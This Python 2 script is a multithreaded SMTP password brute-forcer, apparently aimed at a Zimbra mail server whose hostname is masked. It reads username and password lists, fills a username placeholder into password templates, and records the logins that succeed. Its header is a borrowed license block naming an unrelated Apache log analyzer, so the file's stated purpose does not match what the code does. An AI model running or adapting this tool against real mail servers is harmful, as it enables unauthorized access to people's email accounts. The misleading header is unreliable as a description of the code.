# -*- coding: utf-8 -*-
#!/usr/bin/env python
"""
	Scalp! Apache log based attack analyzer
	by Romain Gaucher <r@rgaucher.info> - http://rgaucher.info
	                                      http://code.google.com/p/apache-scalp


	Copyright (c) 2008 Romain Gaucher <r@rgaucher.info>

	Licensed under the Apache License, Version 2.0 (the "License");
	you may not use this file except in compliance with the License.
	You may obtain a copy of the License at

		http://www.apache.org/licenses/LICENSE-2.0

	Unless required by applicable law or agreed to in writing, software
	distributed under the License is distributed on an "AS IS" BASIS,
	WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
	See the License for the specific language governing permissions and
	limitations under the License.
"""
import time
import sys
import os
import smtplib
import traceback
import threading

MAIL_HOST = 'mail.***.cn'
#mail_host = '10.132.26.13'
mail_user = '****'

PASSWORD_VARIABLE = ('%USERNAME%',)
USER_FILE = 'email_user.txt'
PASSWORD_FILE = 'passwords.txt'


def format_password(username, password):
    '''
    格式化密码，动态生成对应密码
    '''
    if PASSWORD_VARIABLE[0] in password:
        password = password.replace(PASSWORD_VARIABLE[0], username)
    return password
        

def load_password_file(pwfile):
    '''
    加载常见密码模板
    '''
    password_list = []
    if pwfile and os.path.isfile(pwfile):
        with open(pwfile,'r') as fp:
            password_list = [line.strip() for line in fp.readlines()]
    return password_list

def load_user_file(userfile):
    '''
    加载常见用户信息
    '''    
    user_list = []
    if userfile and os.path.isfile(userfile):
        with open(userfile, 'r') as fp:
            user_list = [line.strip() for line in fp.readlines()]
    return user_list
    

def login_zimbra(username, password):
    ret = 0
    password = format_password(username, password)
    try:
        s = smtplib.SMTP_SSL(MAIL_HOST, 465)
        (code, resp) = s.login(username, password)
        
        if code in (235, 503):
            #print "login ok:%s %s" % (username, password)
            ret = 1
        s.close()
    except smtplib.SMTPAuthenticationError as e:
        print "login error:%s %s" % (username, password)
        pass
    except smtplib.SMTPConnectError as e:
        print 'Exception: ', e
        pass
    except Exception as e:
        #SMTPAuthenticationError
        traceback.print_exc(file=sys.stdout)
        print 'Exception: ', e
        print (code, resp)
    return (ret, username, password)


login_ok_result = []
user_list = load_user_file(USER_FILE)
user_list.reverse()
password_list = load_password_file(PASSWORD_FILE)
threads = []
GLOCK = threading.Lock()

def fuzz_zimbra():
    while True:
        GLOCK.acquire()
        if user_list:
            username = user_list.pop()
        else:
            GLOCK.release()
            return
        GLOCK.release()
        for password in password_list:
            (ret, username, password) = login_zimbra(username, password)
            if ret:
                print "login ok:%s %s" % (username, password)
                GLOCK.acquire()
                login_ok_result.append((username, password))
                GLOCK.release()
                break
            else:
                #print "login error:%s %s" % (username, password)
                pass
                
            
if __name__ == "__main__":

    
    for i in range(0,50):
        threads.append(threading.Thread(target=fuzz_zimbra))
    for t in threads:
        t.setDaemon(True)
        t.start()
    for t in threads:
        t.join()
      
    print login_ok_result
